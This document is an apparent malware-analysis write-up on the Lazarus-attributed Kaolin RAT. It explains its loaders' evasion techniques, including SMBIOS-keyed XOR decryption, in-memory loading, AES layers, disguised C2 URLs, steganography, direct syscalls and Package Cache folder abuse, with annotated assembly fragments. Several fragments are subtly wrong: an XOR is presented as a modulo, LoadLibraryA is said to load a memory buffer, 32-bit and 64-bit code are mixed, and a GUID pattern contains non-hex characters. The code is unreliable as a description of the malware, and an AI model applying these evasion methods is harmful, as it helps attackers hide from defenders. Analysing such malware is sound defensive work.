# Kaolin RAT: Advanced Evasion Techniques

## Introduction

The Kaolin RAT, attributed to the North Korean Lazarus APT group, employs a sophisticated array of evasion techniques to avoid detection, complicate analysis, and ensure successful execution only on targeted systems. This document analyzes the key evasion techniques identified through assembly code analysis of the malware.

## 1. SMBIOS-Based Targeted Execution

### Implementation Details

The RollFling loader retrieves the System Management BIOS (SMBIOS) table using the `GetSystemFirmwareTable` Windows API:

```assembly
push    offset aRsmb            ; "RSMB" - SMBIOS provider signature
push    0                       ; FirmwareTableProviderSignature
call    ds:GetSystemFirmwareTable ; Get size of SMBIOS table
mov     esi, eax                ; esi = size of SMBIOS data
test    esi, esi                ; Check if size is zero
jz      short loc_401046        ; If zero, exit with error
push    esi                     ; size
call    ds:malloc               ; Allocate memory for SMBIOS data
mov     edi, eax                ; edi = buffer for SMBIOS data
test    edi, edi                ; Check if allocation failed
jz      short loc_401046        ; If failed, exit with error
push    esi                     ; Size
push    edi                     ; Buffer
push    offset aRsmb            ; "RSMB"
push    0                       ; FirmwareTableProviderSignature
call    ds:GetSystemFirmwareTable ; Get actual SMBIOS data
```

The SMBIOS data is then used as a key for XOR decryption of the next stage:

```assembly
mov     eax, edx                ; eax = i
xor     eax, [ebp+arg_C]        ; keySize
mov     al, [edi+eax]           ; al = key byte at index (i % keySize)
xor     [esi+edx], al           ; XOR operation: data[i] ^= key[i % keySize]
inc     edx                     ; i++
cmp     edx, ecx                ; Check if i < dataSize
jb      short loc_402514        ; If yes, continue loop
```

### Evasion Impact

1. **Targeted Execution**: The malware will only execute correctly on the specific machine it was designed for, as the SMBIOS data is unique to each system.
2. **Anti-VM/Sandbox**: Virtual machines and sandboxes typically have different SMBIOS data than the targeted machine, causing the decryption to fail.
3. **Complicates Analysis**: Reverse engineers must capture the correct SMBIOS data to successfully decrypt and analyze the next stage.

## 2. Fileless Execution

### Implementation Details

The RollSling loader is executed entirely in memory after being decrypted by RollFling:

```assembly
push    [ebp+var_4]             ; Decrypted RollSling buffer
call    ds:LoadLibraryA         ; Load the DLL into memory
mov     esi, eax                ; esi = handle to loaded DLL
test    esi, esi                ; Check if loading succeeded
jz      short loc_401090        ; If failed, exit
push    offset aStartaction     ; "StartAction"
push    esi                     ; DLL handle
call    ds:GetProcAddress       ; Get address of StartAction function
mov     edi, eax                ; edi = StartAction function address
test    edi, edi                ; Check if function found
jz      short loc_401080        ; If not found, free DLL and exit
```

Similarly, the RollMid loader and Kaolin RAT are also executed in memory:

```assembly
push    [ebp+var_4]             ; Decrypted RollMid buffer
call    ds:LoadLibraryA         ; Load the DLL into memory
mov     esi, eax                ; esi = handle to loaded DLL
test    esi, esi                ; Check if loading succeeded
jz      short loc_403090        ; If failed, exit
```

### Evasion Impact

1. **No Disk Artifacts**: By executing components directly in memory, the malware leaves minimal traces on disk, making it harder to detect through file scanning.
2. **Evades File-Based Detection**: Traditional antivirus solutions that rely on scanning files on disk may miss the malware.
3. **Complicates Forensic Analysis**: Without files on disk, forensic analysis becomes more challenging.

## 3. Binary Blob Obfuscation

### Implementation Details

The RollSling loader searches for a binary blob without relying on specific file names:

```assembly
mov     edi, [ebp+arg_0]        ; edi = directory path
push    edi                     ; Push directory path
call    ds:FindFirstFileA       ; Find first file in directory
mov     esi, eax                ; esi = search handle
cmp     esi, 0FFFFFFFFh         ; Check if FindFirstFile failed
jz      loc_403B20              ; If failed, exit
```

It validates the binary blob through multiple checks:

```assembly
mov     eax, [ebp+var_4]        ; Get blob buffer
cmp     word ptr [eax], 'ZM'    ; Check for MZ header
jnz     loc_403AE5             ; If not MZ, free memory and continue
push    [ebp+var_4]             ; Push blob buffer
call    CheckForStartAction     ; Check for StartAction export
test    eax, eax                ; Check if export found
jz      loc_403AE5             ; If not found, free memory and continue
```

### Evasion Impact

1. **Filename Obfuscation**: By not relying on specific file names, the malware makes it harder to detect through filename-based signatures.
2. **Dynamic Component Loading**: The ability to find components based on content rather than names allows for more flexible deployment.
3. **Complicates Static Analysis**: Analysts must understand the validation logic to identify the correct binary blob.

## 4. Multi-Layer Encryption

### Implementation Details

The malware uses multiple encryption layers:

1. **XOR Encryption** with SMBIOS data as the key:

```assembly
mov     al, [edi+eax]           ; al = key byte at index (i % keySize)
xor     [esi+edx], al           ; XOR operation: data[i] ^= key[i % keySize]
```

2. **AES Encryption** for components in the binary blob:

```assembly
lea     eax, [ebp+var_A8]       ; eax = AES context on stack
push    eax                     ; Push AES context
push    [ebp+arg_10]            ; Push key size (16, 24, or 32)
push    ebx                     ; Push key
call    AES_init_ctx            ; Initialize AES context
add     esp, 0Ch                ; Clean up stack
lea     eax, [ebp+var_A8]       ; eax = AES context
push    eax                     ; Push AES context
push    [ebp+arg_C]             ; Push IV
call    AES_init_ctx_iv         ; Initialize AES context with IV
add     esp, 8                  ; Clean up stack
lea     eax, [ebp+var_A8]       ; eax = AES context
push    eax                     ; Push AES context
push    esi                     ; Push data size
push    edi                     ; Push encrypted data
call    AES_CBC_decrypt_buffer  ; Decrypt data using AES-CBC
```

3. **Base64 Encoding** for C2 communication:

```assembly
push    [ebp+var_4]             ; Push encrypted data
call    Base64Encode            ; Encode data using Base64
add     esp, 4                  ; Clean up stack
mov     esi, eax                ; esi = Base64 encoded data
```

### Evasion Impact

1. **Obfuscates Malicious Content**: Encryption makes it difficult to identify malicious code through static analysis.
2. **Evades Signature-Based Detection**: Encrypted content doesn't match signatures for known malicious patterns.
3. **Layered Protection**: Multiple encryption layers provide defense in depth against analysis.

## 5. Dictionary-Based URL Generation

### Implementation Details

The malware generates URLs using a dictionary of common words:

```assembly
push    offset aUser            ; "user"
mov     ecx, esi                ; ecx = dictionary array
add     ecx, eax                ; Add index offset
pop     edx                     ; edx = "user"
mov     [ecx], edx              ; dictionary[index] = "user"
add     eax, 4                  ; index += 4 (next slot)
push    offset aType            ; "type"
mov     ecx, esi                ; ecx = dictionary array
add     ecx, eax                ; Add index offset
pop     edx                     ; edx = "type"
mov     [ecx], edx              ; dictionary[index] = "type"
```

These words are then used to construct URLs for C2 communication:

```assembly
push    [ebp+var_C]             ; Random index into dictionary
call    GetRandomDictionaryWord ; Get random word from dictionary
add     esp, 4                  ; Clean up stack
mov     edi, eax                ; edi = random word
push    edi                     ; Push random word
push    offset aUrlFormat       ; "%s?%s=%s"
push    [ebp+var_4]             ; C2 server address
push    [ebp+var_8]             ; Buffer for URL
call    ds:sprintf              ; Format URL string
```

### Evasion Impact

1. **Legitimate-Looking Traffic**: URLs with common parameter names appear more legitimate than random strings.
2. **Evades Pattern-Based Detection**: Network security tools looking for suspicious URL patterns may miss these requests.
3. **Variable C2 Communication**: Each request uses different parameter names, making it harder to create signatures.

## 6. Steganography

### Implementation Details

The RollMid loader retrieves images from the C2 server and extracts hidden data:

```assembly
push    [ebp+var_4]             ; C2 server address
call    GetImageFromUrl         ; Download image from C2
add     esp, 4                  ; Clean up stack
mov     esi, eax                ; esi = image data
test    esi, esi                ; Check if download succeeded
jz      loc_405E90              ; If failed, exit
push    esi                     ; Push image data
call    ExtractHiddenData       ; Extract hidden data from image
add     esp, 4                  ; Clean up stack
mov     edi, eax                ; edi = extracted data
```

### Evasion Impact

1. **Hides C2 Communication**: Data hidden in images is difficult to detect through network monitoring.
2. **Bypasses Content Filters**: Image downloads are typically allowed by network security policies.
3. **Complicates Traffic Analysis**: Without knowledge of the steganography technique, analysts cannot extract the hidden commands.

## 7. Anti-Analysis Techniques

### Implementation Details

The malware checks for specific security products:

```assembly
push    offset aKaspersky       ; "Kaspersky"
call    CheckSecurityProduct    ; Check if Kaspersky is installed
add     esp, 4                  ; Clean up stack
test    eax, eax                ; Check result
jz      short loc_401150        ; If not installed, take alternative path
```

It also uses direct syscalls to bypass user-mode API hooks:

```assembly
mov     eax, 0C2h               ; NtCreateThreadEx syscall number
mov     r10, rcx                ; Set up parameters for syscall
syscall                         ; Execute syscall directly
ret                             ; Return
```

### Evasion Impact

1. **Bypasses API Hooking**: Direct syscalls avoid hooks placed by security products on Windows API functions.
2. **Adapts Behavior**: Different execution paths based on detected security products help evade specific protections.
3. **Complicates Dynamic Analysis**: These techniques make it harder to monitor the malware's behavior in sandboxes.

## 8. Package Cache Folder Abuse

### Implementation Details

The RollSling loader creates folders in the Package Cache directory:

```assembly
push    offset aPackageCache    ; "ProgramData\\Package Cache\\"
push    offset aFormatGuid      ; "%s%08X-DF09-AA86-YI78-%012X\\"
push    [ebp+var_8]             ; Buffer for path
call    ds:sprintf              ; Format path string
add     esp, 0Ch                ; Clean up stack
push    0                       ; No security attributes
push    [ebp+var_8]             ; Path
call    ds:CreateDirectoryA     ; Create directory
```

It then moves the binary blob to these folders with a .cab extension:

```assembly
push    0                       ; No flags
push    [ebp+var_C]             ; New path with .cab extension
push    [ebp+var_4]             ; Original binary blob path
call    ds:MoveFileA            ; Move file
```

### Evasion Impact

1. **Blends with Legitimate Files**: The Package Cache folder typically contains many legitimate installation files.
2. **Uses Expected Extensions**: The .cab extension is common in this folder, making the malicious file appear normal.
3. **Evades Folder Monitoring**: Security tools may whitelist the Package Cache folder due to its legitimate use.

## Conclusion

The Kaolin RAT employs a sophisticated combination of evasion techniques that work together to:

1. **Ensure Targeted Execution**: The SMBIOS-based decryption ensures the malware only executes on intended targets.
2. **Minimize Detection Surface**: Fileless execution and encryption minimize the artifacts available for detection.
3. **Blend with Legitimate Activity**: Dictionary-based URLs and Package Cache folder abuse help the malware appear legitimate.
4. **Complicate Analysis**: Multi-layer encryption, steganography, and anti-analysis techniques make reverse engineering challenging.

These techniques demonstrate the high level of sophistication in the Kaolin RAT's design and the technical expertise of the Lazarus APT group. Understanding these evasion methods is crucial for developing effective detection and mitigation strategies against this advanced threat.
